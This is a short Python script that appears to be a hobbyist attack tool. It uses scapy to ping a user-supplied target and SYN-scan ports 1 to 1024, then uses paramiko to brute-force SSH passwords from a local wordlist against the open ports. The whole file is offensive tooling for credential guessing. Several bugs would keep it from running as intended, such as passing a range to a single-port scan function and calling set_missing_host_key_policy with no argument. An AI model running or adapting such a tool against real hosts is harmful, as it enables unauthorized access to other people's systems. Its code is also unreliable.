from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP
import paramiko

target = input("input target")
registered_ports = range(1, 1025)
open_ports = []


def scanport(port):
    src_port = RandShort()
    conf.verb = 0
    sync_packet = sr1(IP(dst=target) / TCP(sport=src_port, dport=port, flags="S"), timeout=0.5)
    if sync_packet is None:
        print("{} is closed".format(port))
        return False
    if not sync_packet.haslayer(TCP):
        print("{} is closed".format(port))
        return False
    if sync_packet.flags == 0x12:
        sr(IP(dst=target) / TCP(sport=src_port, dport=port, flags="R"), timeout=2)
        print("{} are 0x12 ACK".format(port))
        open_ports.append(port)
        return True


def check_availability():
    try:
        conf.verb = 0
        response = sr1(IP(dst=target) / ICMP(), timeout=3)
    except Exception as e:
        print(e)
        return False
    if response is not None:
        return True
    return False


def availability_test():
    print("AVAILABLE")
    open_ports = scanport(registered_ports)
    print("Scan finished")
    if 22 in open_ports:
        return open_ports


def bruteForce(port):
    with open(r'C:\Users\MSI User\Desktop\passwordlist.txt', 'r') as f:
        user = input("type username")
        SSHconn = paramiko.SSHClient()
        SSHconn.set_missing_host_key_policy()

        for password in f:
            try:
                SSHconn.connect(target, port=int(port), username=user, password=password, timeout=1)
                print("{} is correct password".format(password))
                SSHconn.close()
                break


            except Exception as exc:
                print("{} failed".format(password))
                print(exc)


if check_availability():
    availability_test()
    if str(input("Do you want to bruteforce? Y/N")).upper() == "Y":
        for port in open_ports:
            bruteForce(port)
